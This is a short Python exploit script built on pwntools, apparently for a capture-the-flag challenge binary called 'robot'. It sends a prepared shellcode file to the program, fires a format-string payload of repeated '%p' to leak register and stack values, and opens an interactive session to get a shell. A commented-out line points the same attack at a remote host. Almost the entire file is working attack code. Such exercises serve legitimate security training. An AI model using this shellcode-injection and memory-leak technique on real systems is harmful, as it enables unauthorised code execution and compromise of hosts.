#!/usr/bin/env python3
# -*- encoding: utf-8 -*-

import time
from pwn import *
context.update(arch = 'amd64', os = 'linux', log_level = 'debug')

elf  = ELF('./robot')

# Byte sequence alias
A8 = 8 * b'A'


def play(proc):
    hit_left = False
    hit_bottom = False
    count = 1000

    while count > 0 and not hit_left:
        count -= 1
        time.sleep(0.1)
        proc.send(b'MA')
        result = proc.recvS(64)
        hit_left = 'Failed' in result

    while count > 0 and not hit_bottom:
        count -= 1
        time.sleep(0.1)
        proc.send(b'MS')
        result = proc.recvS(64)
        hit_bottom = 'Failed' in result

    while count > 0:
        print('remaining moves: {}'.format(count))
        count -= 1
        time.sleep(0.1)
        proc.send(b'S')

        robot_x = u32(proc.recv(1).ljust(4, b'\x00')) - 1
        robot_y = u32(proc.recv(1).ljust(4, b'\x00')) - 1
        outlaw_x = u32(proc.recv(1).ljust(4, b'\x00')) - 1
        outlaw_y = u32(proc.recv(1).ljust(4, b'\x00')) - 1
        proc.recv(60)  # discard the remaining bytes received

        print('robot: ({},{})  outlaw: ({}, {})'.format(
            robot_x, robot_y, outlaw_x, outlaw_y))


def main():
    # proc = remote('140.112.31.97', 30202)
    proc = elf.process()
    # proc = process(['./ld.so', './elf'], env={'LD_PRELOAD': './libc.so'})
    log.debug('You may attatch this process to gdb now.')
    input()

    proc.recvuntil('Give me code : ')
    with open('./shellcode/shell.bin', 'rb') as f:
        proc.sendline(f.read())

    #play(proc)

    # This will leak rdx, rcx, r8, r9, [rsp], [rsp+8], ...
    time.sleep(0.1)
    proc.sendline(b'M.%p.%p.%p.%p.%p.%p.%p')

    proc.interactive()


if __name__ == '__main__':
    main()
